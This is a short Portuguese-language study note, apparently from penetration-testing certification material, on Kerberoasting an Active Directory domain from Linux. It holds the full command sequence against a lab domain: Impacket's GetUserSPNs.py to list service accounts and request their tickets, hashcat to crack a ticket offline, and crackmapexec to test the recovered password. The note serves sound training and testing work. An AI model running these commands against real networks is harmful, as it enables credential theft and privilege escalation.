> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/active-directory-enumeration-and-attacks/kerberoasting-from-linux.md).

# Kerberoasting - from Linux

Kerberoasting é uma técnica de movimentação lateral/escalonamento de privilégios em ambientes do Active Directory. Esse ataque tem como alvo contas de [Service Principal Names (SPN)](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names) . SPNs são identificadores exclusivos que o Kerberos usa para mapear uma instância de serviço para uma conta de serviço em cujo contexto o serviço está sendo executado.

{% hint style="info" %}
Um pré-requisito para executar ataques Kerberoasting são credenciais de usuário de domínio (texto simples ou apenas um hash NTLM se estiver usando Impacket), um shell no contexto de um usuário de domínio ou uma conta como SYSTEM. Quando tivermos esse nível de acesso, podemos começar. Também precisamos saber qual host no domínio é um Controlador de Domínio para que possamos consultá-lo.
{% endhint %}

* **Listando contas SPN com GetUserSPNs.py**

```sh
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

* **Solicitando todos os ingressos TGS**

```sh
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
```

* **Solicitar um bilhete TGS individual**

```sh
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```

* **Salvando o tíquete TGS em um arquivo de saída**

```sh
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

* **Quebrando o Ticket Offline com Hashcat**

```sh
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force
```

* **Testando autenticação em um controlador de domínio**

```sh
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```
